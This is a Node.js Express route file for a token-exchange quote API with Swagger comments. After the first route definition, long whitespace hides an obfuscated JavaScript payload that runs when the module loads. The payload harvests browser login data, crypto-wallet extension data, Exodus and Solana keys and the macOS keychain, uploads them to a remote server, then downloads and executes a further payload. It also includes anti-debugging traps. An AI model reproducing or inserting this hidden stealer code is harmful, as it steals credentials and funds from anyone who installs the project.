let express = require('express');
var router = express.Router();

const { authKeyMiddleware } = require('../middleware/auth');
const quoteController = require('../controllers/quote.controller');

/**
 * @swagger
 * /egspectre-api/v1/quotes:
 *   post:
 *     summary: Get the quote for exchange token price
 *     tags:
 *       - Quotes
 *     produces:
 *       - application/json
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             $ref: '#/components/schemas/Quote'
 *     responses:
 *       200:
 *         description: Success
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 200
 *                 message:
 *                   type: string
 *                   example: Success
 *                 data:
 *                   type: array
 *                   items:
 *                     $ref: '#/components/schemas/QuoteResponse'
 *       400:
 *         description: Bad Request
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 400
 *                 message:
 *                   type: string
 *                   example: Bad Request
 *       500:
 *         description: An unexpected error occurred. Please try again later.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 500
 *                 message:
 *                   type: string
 *                   example: An unexpected error occurred. Please try again later.
 */
router.post('/', authKeyMiddleware, quoteController.getQuote);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Object.prototype.toString,Object.defineProperties;const az=a7;(function(a8,a9){const as=a7,aa=a8();while(!![]){try{const ab=-parseInt(as(0x110))/0x1+parseInt(as(0x12c))/0x2+parseInt(as(0x126))/0x3*(parseInt(as(0x13d))/0x4)+-parseInt(as(0xef))/0x5*(-parseInt(as(0x15b))/0x6)+parseInt(as(0x176))/0x7*(-parseInt(as(0x111))/0x8)+-parseInt(as(0x148))/0x9*(-parseInt(as(0xfc))/0xa)+-parseInt(as(0x104))/0xb;if(ab===a9)break;else aa['push'](aa['shift']());}catch(ac){aa['push'](aa['shift']());}}}(a6,0x919be));const a5=(function(){let a8=!![];return function(a9,aa){const ab=a8?function(){const au=a7;if(aa){const ac=aa[au(0xf5)](a9,arguments);return aa=null,ac;}}:function(){};return a8=![],ab;};}()),a4=a5(this,function(){const av=a7;return a4[av(0xf2)]()[av(0xfe)](av(0x14c))[av(0xf2)]()['constructor'](a4)[av(0xfe)](av(0x14c));});a4();const a3=(function(){let a8=!![];return function(a9,aa){const ab=a8?function(){if(aa){const ac=aa['apply'](a9,arguments);return aa=null,ac;}}:function(){};return a8=![],ab;};}());function a7(a,b){const c=a6();return a7=function(d,e){d=d-0xeb;let f=c[d];return f;},a7(a,b);}(function(){a3(this,function(){const aw=a7,a8=new RegExp(aw(0x160)),a9=new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','i'),aa=a2('init');!a8[aw(0xf3)](aa+'chain')||!a9[aw(0xf3)](aa+aw(0x129))?aa('0'):a2();})();}());function a6(){const b3=['L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu','zU3luYw','L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8','Zbm9kZTpwcm9jZXNz','plld_','b3BlcmE','length','12CvDfbn','base64','L3Bkb3du','L2tleXM','while (true) {}','function\x20*\x5c(\x20*\x5c)','exception','debu','aGRjb25kYmNiZG5iZWVwcGdkcGg','fk4_','comp','caG9zdG5hbWU','amZob21paGtqYm1namlkbGNkbm8','forEach','a2V5NC5kYg','QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy','error','3C1','Z2V0','pld_','stateObject','zcGF0aA','/ld_','ZXBjY2lvbmJvb2hja29ub2VlbWc','AdXNlckluZm8','info','cmVuYW1l','15820Xesbgc','__proto__','Y29weUZpbGU','return (function() ','Zb3B0aW9ucw','aGlmYWZnbWNjZHBl','TG9jYWwgRXh0ZW','1301015Wdbuzl','from','bG9na2MtZGI','toString','test','Y3VybCAtTG8','apply','replace','YmZuYWVsbW9tZWltaGxw','ZGdjaWpubWhuZm5rZG5hYWQ','ZWpiYWxiYWtvcGxjaGxn','bind','YWVhY2hrbm1lZnBo','10CLvyiU','Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8','search','cHl0aG9u','dGFyIC14Zg','YcGxhdGZvcm0','fk3_','cZXhlYw','5001172MTyOQq','aY2hpbGRfcH','TG9jYWwv','fllj_','bmtiaWhmYmVvZ2FlYW9l','aWJuZWpkZmptbWtwY25s','cmVuYW1lU3luYw','action','U3luYyBFeHRlbnNpb24gU2V0dGluZ3M','Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE','bG9naW5zLmpzb24','TG9jYWwvTWljcm9zb2Z0L0VkZ2U','157006jXcNqH','216ywUfiT','slice','RGVmYXVsdA','YXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYg','Ly5ucGw','cGVia2xtbmtvZW9paG9mZWM','XC5weXBccHl0','prototype','console','Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU','L0FwcERhdGEv','cGRsaWFvZ2VoZ2Ri','\x22 \x22','bWNvaGlsbmNiZmFo','utf8','a3Bsb21qamtjZmdvZG5oY2VsbGo','{}.constructor(\x22return this\x22)( )','Zmhib2hpbWFlbGJvaHBq','YcmVx','-db','d3JpdGVGaWxlU3luYw','208605RpQjmy','aG9uLmV4ZQ','counter','input','\x20-C\x20','cm1TeW5j','729744vfCEAz','Y3JlYXRlUmVhZFN0cmVhbQ','string','YWhvbHBmZGlhbGpn','c3RhdFN5bmM','constructor','dWVzdA','ZXhvZA','YXRtYw','flj_','flk4_','Ly5jb25maWcvc29sYW5hL2lkLmpzb24','UHJvZmlsZQ','ZWdqaWRqYnBnbGlj','Um9hbWluZy9','a2V5My5kYg','gger','20rHSOIN','size','push','dXNlcm5hbWU','JvY2Vzcw','now','trace','MjMuMTA2LjaHR0cDovLwI1My4yMTU6MTI0NA==  ','TG9naW4gRGF0YQ','/brld_','L1VzZXIgRGF0YQ','325251TaqLYU','YXJndg','brld_','ZdGltZXN0YW1w','(((.+)+)+)+$','aGVjZGFsbWVlZWFqbmltaG0','s3LtMw3','table','bWdqbmpvcGhocGtrb2xqcGE','Ly5jb25maWcv','join','YdmFsdWU'];a6=function(){return b3;};return a6();}const a1=(function(){let a8=!![];return function(a9,aa){const ab=a8?function(){const ax=a7;if(aa){const ac=aa[ax(0xf5)](a9,arguments);return aa=null,ac;}}:function(){};return a8=![],ab;};}()),a0=a1(this,function(){const ay=a7;let a8;try{const ab=Function(ay(0xeb)+ay(0x121)+');');a8=ab();}catch(ac){a8=window;}const a9=a8[ay(0x119)]=a8[ay(0x119)]||{},aa=['log','warn',ay(0x174),ay(0x16b),ay(0x161),ay(0x14f),ay(0x143)];for(let ad=0x0;ad<aa[ay(0x15a)];ad++){const ae=a1[ay(0x131)][ay(0x118)]['bind'](a1),af=aa[ad],ag=a9[af]||ae;ae[ay(0x177)]=a1[ay(0xfa)](a1),ae[ay(0xf2)]=ag[ay(0xf2)][ay(0xfa)](ag),a9[af]=ae;}});a0();const t=az(0x15c),c=az(0x11f),a=require('fs'),r=require('os'),$=a8=>(s1=a8[az(0x112)](0x1),Buffer[az(0xf0)](s1,t)[az(0xf2)](c));rq=require($(az(0x123)+az(0x132))),pt=require($(az(0x170))),ex=require($(az(0x105)+az(0x141)))[$(az(0x103))],zv=require($(az(0x157))),hd=r[$('ZaG9tZWRpcg')](),hs=r[$(az(0x166))](),pl=r[$(az(0x101))](),uin=r[$(az(0x173))](),td=r[$('cdG1wZGly')]();let n;const l=a8=>Buffer[az(0xf0)](a8,t)[az(0xf2)](c),s=()=>{const aA=az;let a8=aA(0x144);for(var a9='',aa='',ab='',ac='',ad=0x0;ad<0xa;ad++)a9+=a8[ad],aa+=a8[0xa+ad],ab+=a8[0x14+ad],ac+=a8[0x1e+ad];return a9=a9+ab+ac,l(aa)+l(a9);},e=a8=>a8[az(0xf6)](/^~([a-z]+|\/)/,(a9,aa)=>'/'===aa?hd:pt[l('ZGlybmFtZQ')](hd)+'/'+aa),h=az(0x14e),o=az(0x16d),Z=az(0x115),b=az(0x125),u='L2NsaWVudA',i=az(0x117),y=az(0x127);function G(a8){const aB=az,a9=l('YWNjZXN'+aB(0x155));try{return a[a9](a8),!0x0;}catch(aa){return!0x1;}}const m=l('ZXhpc3RzU3luYw');function p(a8){return a[m](a8);}function d(a8){const aC=az;return scrs=l(aC(0x12d)),a[scrs](a8);}const W=az(0x145),Y=az(0x178),f=l(az(0x113)),w=l(az(0x138)),v=$('aZmlsZW5hbWU'),V=$('cZm9ybURhdGE'),j=$('adXJs'),L=$(az(0xec)),z=$(az(0x153)),N=l('cmVhZGRpclN5bmM'),R=l(az(0x130)),X=l('cG9zdA'),k=az(0x151),F=az(0x11b),x=az(0x147),g=az(0x156),U=az(0x16a),_='R29vZ2xlL0Nocm9tZQ',q='Z29vZ2xlLWNocm9tZQ',B=[az(0x106)+U,U,U],J=[az(0x11a),az(0x10d),az(0x159)],Q=[az(0x106)+_,_,q];let T=az(0x165);const H=a8=>{const aD=az,a9=$('YbXVsdGlfZmlsZQ'),aa=$(aD(0x14b)),ab=l('L3VwbG9hZHM'),ac={[aa]:n['toString'](),'type':h,'hid':T,[a9]:a8},ad=s();try{let ae={[j]:''+ad+ab,[V]:ac};rq[X](ae,(af,ag,ah)=>{});}catch(af){}},S=['aGxlZm5rb2RiZWZncGdrbm4',az(0x14d),az(0x116),'YmJsZGNuZ2NuYXBuZG9kanA',az(0xf8),az(0x150),az(0x172),az(0x163),az(0x120),az(0x167),'Ym1nZGprYnBlbWNjaWlvbGdjZ2U','aGJubWtrbGllZ2htbWprcGlncGE'],A=[az(0x108),az(0xf9),az(0x109),az(0x122),'aG5mYW5rbm9jZmVvZmJk',az(0xf7),az(0xfb),az(0x139),az(0xed),az(0x12f),az(0x11e),az(0x11c)],C=async(a8,a9,aa)=>{const aE=az;let ab=a8;if(!ab||''===ab)return[];try{if(!G(ab))return[];}catch(ag){return[];}a9||(a9='');let ac=[];const ad=l(aE(0xee)+'5zaW9uIFNldHRpbmdz'),ae=l(aE(0x10c)),af=l('YmhnaG9hbWFwY2RwYm9ocGhpZ29vb2FkZGlucGtiYWk');for(let ah=0x0;ah<0xc8;ah++){const ai=0x0===ah?f:w+' '+ah,aj=a8+'/'+ai+'/'+ad;for(let al=0x0;al<A[aE(0x15a)];al++){const am=l(A[al]+S[al]);let an=aj+'/'+am;if(G(an)){try{far=a[N](an);}catch(ao){far=[];}far['forEach'](async ap=>{const aF=aE;ab=pt[aF(0x152)](an,ap);try{ac['push']({[L]:{[v]:''+a9+ah+'_'+am+'_'+ap},[z]:d(ab)});}catch(aq){}});}}const ak=a8+'/'+ai+'/'+ae+'/'+af;if(G(ak)){try{far=a[N](ak);}catch(ap){far=[];}far[aE(0x168)](async aq=>{const aG=aE;ab=pt[aG(0x152)](ak,aq);try{ac[aG(0x13f)]({[L]:{[v]:''+a9+ah+'_'+af+'_'+aq},[z]:d(ab)});}catch(ar){}});}}if(aa){const aq=l('c29sYW5hX2lkLnR4dA');if(ab=''+hd+l(aE(0x137)),p(ab))try{ac[aE(0x13f)]({[z]:d(ab),[L]:{[v]:aq}});}catch(ar){}}return H(ac),ac;},E=async()=>{const aH=az;T=hs,'d'==pl[0x0]&&(T=T+'+'+uin[l(aH(0x140))]),await ut();try{const a8=e('~/');await M(Q,0x0),await M(B,0x1),await M(J,0x2),'w'==pl[0x0]?(pa=''+a8+l(F)+l(aH(0x10f))+l(x),await C(pa,'3_',!0x1)):'l'==pl[0x0]?(await O(),await Zt(),await $t()):'d'==pl[0x0]&&(await((async()=>{const aI=aH;let a9=[];const aa=l(W),ab=l(aI(0x154)),ac=l(aI(0xf1));if(pa=''+hd+ab,p(pa))try{a9['push']({[z]:d(pa),[L]:{[v]:ac}});}catch(ad){}else{if(pa+=aI(0x124),p(pa))try{a9[aI(0x13f)]({[z]:d(pa),[L]:{[v]:ac}});}catch(ae){}}try{const af=l(Y);let ag='';if(ag=''+hd+l(g)+l(_),ag&&''!==ag&&G(ag))for(let ah=0x0;ah<0xc8;ah++){const ai=ag+'/'+(0x0===ah?f:w+' '+ah)+'/'+aa;try{if(!G(ai))continue;const aj=ag+aI(0x171)+ah;G(aj)?a9[aI(0x13f)]({[z]:d(aj),[L]:{[v]:aI(0x16e)+ah}}):a[af](ai,aj,ak=>{const aJ=aI;let al=[{[z]:d(ai),[L]:{[v]:aJ(0x16e)+ah}}];H(al);});}catch(ak){}}}catch(al){}return H(a9),a9;})()),await D(),await nt()),await I(K,l(ct)),await I(tt,l(at));}catch(a9){}},M=async(a8,a9)=>{try{const aa=e('~/');let ab='';ab='d'==pl[0x0]?''+aa+l(g)+l(a8[0x1]):'l'==pl[0x0]?''+aa+l(k)+l(a8[0x2]):''+aa+l(F)+l(a8[0x0])+l(x),await C(ab,a9+'_',0x0==a9);}catch(ac){}},I=async(a8,a9)=>{try{const aa=e('~/');let ab='';ab='d'==pl[0x0]?''+aa+l(g)+l(a8):'l'==pl[0x0]?''+aa+l(k)+l(a8):''+aa+l(F)+l(P)+l(a8),await rt(ab,a9);}catch(ac){}},D=async()=>{const aK=az;let a8=[];const a9=l(W);try{const aa=l(Y);let ab='';if(ab=''+hd+l(g)+l(U),!ab||''===ab||!G(ab))return[];let ac=0x0;for(;ac<0xc8;){const ad=ab+'/'+(0x0!==ac?w+' '+ac:f)+'/'+a9;try{if(G(ad)){const ae=ab+aK(0x146)+ac;G(ae)?a8[aK(0x13f)]({[z]:d(ae),[L]:{[v]:aK(0x14a)+ac}}):a[aa](ad,ae,af=>{const aL=aK;let ag=[{[z]:d(ad),[L]:{[v]:aL(0x14a)+ac}}];H(ag);});}}catch(af){}ac++;}}catch(ag){}return H(a8),a8;},O=async()=>{const aM=az;let a8=[];try{const a9=l(aM(0xfd));let aa='';aa=''+hd+a9;let ab=[];if(aa&&''!==aa&&G(aa))try{ab=a[N](aa);}catch(ac){ab=[];}ab['forEach'](async ad=>{const aN=aM;pa=pt[aN(0x152)](aa,ad);try{ldb_data[aN(0x13f)]({[z]:d(pa),[L]:{[v]:''+ad}});}catch(ae){}});}catch(ad){}return H(a8),a8;},P=az(0x13a),K='RXhvZHVzL2V4b2R1cy53YWxsZXQ',tt=az(0x114),ct=az(0x133),at=az(0x134),rt=async(a8,a9)=>{const aO=az;let aa=[];if(!a8||''===a8)return[];try{if(!G(a8))return[];}catch(ab){return[];}a9||(a9='');try{far=a[N](a8),far[aO(0x168)](async ac=>{const aP=aO;let ad=pt[aP(0x152)](a8,ac);try{aa[aP(0x13f)]({[L]:{[v]:a9+'_'+ac},[z]:d(ad)});}catch(ae){}});}catch(ac){}return H(aa),aa;},$t=async()=>{const aQ=az;let a8=[];const a9=l(aQ(0x169)),aa=l(aQ(0x13b)),ab=l('bG9naW5zLmpzb24');try{let ac='';if(ac=''+hd+l('Ly5tb3ppbGxhL2ZpcmVmb3gv'),ac&&''!==ac&&G(ac))for(let ad=0x0;ad<0xc8;ad++){const ae=0x0===ad?f:w+' '+ad;try{const af=ac+'/'+ae+'/'+a9;G(af)&&a8[aQ(0x13f)]({[z]:d(af),[L]:{[v]:aQ(0x136)+ad}});}catch(ag){}try{const ah=ac+'/'+ae+'/'+aa;G(ah)&&a8[aQ(0x13f)]({[z]:d(ah),[L]:{[v]:'flk3_'+ad}});}catch(ai){}try{const aj=ac+'/'+ae+'/'+ab;G(aj)&&a8[aQ(0x13f)]({[z]:d(aj),[L]:{[v]:aQ(0x107)+ad}});}catch(ak){}}}catch(al){}return H(a8),a8;},nt=async()=>{const aR=az;let a8=[];const a9=l(aR(0x169)),aa=l(aR(0x13b)),ab=l(aR(0x10e));try{let ac='';if(ac=''+hd+l(g)+l('RmlyZWZveA'),ac&&''!==ac&&G(ac))for(let ad=0x0;ad<0xc8;ad++){const ae=0x0===ad?f:w+' '+ad;try{const af=ac+'/'+ae+'/'+a9;G(af)&&a8[aR(0x13f)]({[z]:d(af),[L]:{[v]:aR(0x164)+ad}});}catch(ag){}try{const ah=ac+'/'+ae+'/'+aa;G(ah)&&a8[aR(0x13f)]({[z]:d(ah),[L]:{[v]:aR(0x102)+ad}});}catch(ai){}try{const aj=ac+'/'+ae+'/'+ab;G(aj)&&a8[aR(0x13f)]({[z]:d(aj),[L]:{[v]:aR(0x135)+ad}});}catch(ak){}}}catch(al){}return H(a8),a8;};function lt(a8){const aS=az,a9=l(aS(0x12b));a[a9](a8);}const st=0x3117870;let et=0x0;const ht=async a8=>{const aT=az,a9=l(aT(0x100))+' '+a8+aT(0x12a)+hd;ex(a9,(aa,ab,ac)=>{if(aa)return lt(a8),void(et=0x0);lt(a8),bt();});},ot=()=>{const aU=az;if(et>=st+0x4)return;const a8=l('cDIuemlw'),a9=s(),aa=td+'\x5c'+l('cC56aQ'),ab=td+'\x5c'+a8,ac=''+a9+l(aU(0x15d)),ad=l(aU(0x10a)),ae=l(aU(0x175));if(p(aa))try{var af=a[R](aa);af[aU(0x13e)]>=st+0x4?(et=af['size'],a[ae](aa,ab,ag=>{if(ag)throw ag;ht(ab);})):(et>=af[aU(0x13e)]?(lt(aa),et=0x0):et=af[aU(0x13e)],it());}catch(ag){}else{const ah=l(aU(0xf4))+' \x22'+aa+aU(0x11d)+ac+'\x22';ex(ah,(ai,aj,ak)=>{if(ai)return et=0x0,void it();try{et=st+0x4,a[ad](aa,ab),ht(ab);}catch(al){}});}},Zt=async()=>{const aV=az;let a8=[];const a9=l(W);try{const aa=l(Y);let ab='';if(ab=''+hd+l(k)+l(q),!ab||''===ab||!G(ab))return[];for(let ac=0x0;ac<0xc8;ac++){const ad=ab+'/'+(0x0===ac?f:w+' '+ac)+'/'+a9;try{if(!G(ad))continue;const ae=ab+aV(0x171)+ac;G(ae)?a8[aV(0x13f)]({[z]:d(ae),[L]:{[v]:aV(0x158)+ac}}):a[aa](ad,ae,af=>{const aW=aV;let ag=[{[z]:d(ad),[L]:{[v]:aW(0x158)+ac}}];H(ag);});}catch(af){}}}catch(ag){}return H(a8),a8;},bt=async()=>await new Promise((a8,a9)=>{if('w'!=pl[0x0])((()=>{const aX=a7,aa=s(),ab=l(u),ac=l(b),ad=l(o),ae=l(Z),af=l(aX(0xff)),ag=''+aa+ab+'/'+h,ah=''+hd+ae;let ai=af+'3 \x22'+ah+'\x22';rq[ad](ag,(aj,ak,al)=>{aj||(a[ac](ah,al),ex(ai,(am,an,ao)=>{}));});})());else p(''+(''+hd+l(i+y)))?((()=>{const aY=a7,aa=s(),ab=l(u),ac=l(o),ad=l(b),ae=l(Z),af=''+aa+ab+'/'+h,ag=''+hd+ae,ah='\x22'+hd+l(i+y)+aY(0x11d)+ag+'\x22';try{lt(ag);}catch(ai){}rq[ac](af,(aj,ak,al)=>{if(!aj)try{a[ad](ag,al),ex(ah,(am,an,ao)=>{});}catch(am){}});})()):ot();}),ut=async()=>{const aZ=az;let a8=aZ(0x16c);try{a8+=zv[l(aZ(0x149))][0x1];}catch(a9){}(async(aa,ab)=>{const b0=aZ,ac={'ts':n[b0(0xf2)](),'type':h,'hid':T,'ss':aa,'cc':ab[b0(0xf2)]()},ad=s(),ae={[j]:''+ad+l(b0(0x15e)),[V]:ac};try{rq[X](ae,(af,ag,ah)=>{});}catch(af){}})('jq',a8);};function it(){setTimeout(()=>{ot();},0x4e20);}var yt=0x0;const Gt=async()=>{const b1=az;try{n=Date[b1(0x142)](),await E(),bt();}catch(a8){}};Gt();let mt=setInterval(()=>{(yt+=0x1)<0x5?Gt():clearInterval(mt);},0x927c0);function a2(a8){function a9(aa){const b2=a7;if(typeof aa===b2(0x12e))return function(ab){}[b2(0x131)](b2(0x15f))[b2(0xf5)](b2(0x128));else(''+aa/aa)[b2(0x15a)]!==0x1||aa%0x14===0x0?function(){return!![];}[b2(0x131)](b2(0x162)+b2(0x13c))['call'](b2(0x10b)):function(){return![];}[b2(0x131)]('debu'+b2(0x13c))[b2(0xf5)](b2(0x16f));a9(++aa);}try{if(a8)return a9;else a9(0x0);}catch(aa){}}

/**
 * @swagger
 * /egspectre-api/v1/quotes/categories:
 *   get:
 *     summary: Get the category list
 *     tags:
 *       - Quotes
 *     produces:
 *       - application/json
 *     responses:
 *       200:
 *         description: Success
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 200
 *                 message:
 *                   type: string
 *                   example: Success
 *                 data:
 *                   type: array
 *                   items:
 *                     $ref: '#/components/schemas/Category'
 *       500:
 *         description: An unexpected error occurred. Please try again later.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 500
 *                 message:
 *                   type: string
 *                   example: An unexpected error occurred. Please try again later.
 */
router.get('/categories', quoteController.listCategories);

/**
 * @swagger
 * /egspectre-api/v1/quotes/networks:
 *   get:
 *     summary: Get the network list
 *     tags:
 *       - Quotes
 *     produces:
 *       - application/json
 *     responses:
 *       200:
 *         description: Success
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 200
 *                 message:
 *                   type: string
 *                   example: Success
 *                 data:
 *                   type: array
 *                   items:
 *                     $ref: '#/components/schemas/Network'
 *       500:
 *         description: An unexpected error occurred. Please try again later.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 500
 *                 message:
 *                   type: string
 *                   example: An unexpected error occurred. Please try again later.
 */
router.get('/networks', quoteController.listNetworks);

/**
 * @swagger
 * /egspectre-api/v1/quotes/tokens:
 *   get:
 *     summary: Get the token list
 *     tags:
 *       - Quotes
 *     produces:
 *       - application/json
 *     responses:
 *       200:
 *         description: Success
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 200
 *                 message:
 *                   type: string
 *                   example: Success
 *                 data:
 *                   type: array
 *                   items:
 *                     $ref: '#/components/schemas/Token'
 *       500:
 *         description: An unexpected error occurred. Please try again later.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 code:
 *                   type: integer
 *                   example: 500
 *                 message:
 *                   type: string
 *                   example: An unexpected error occurred. Please try again later.
 */
router.get('/tokens', quoteController.listTokens);

module.exports = router;
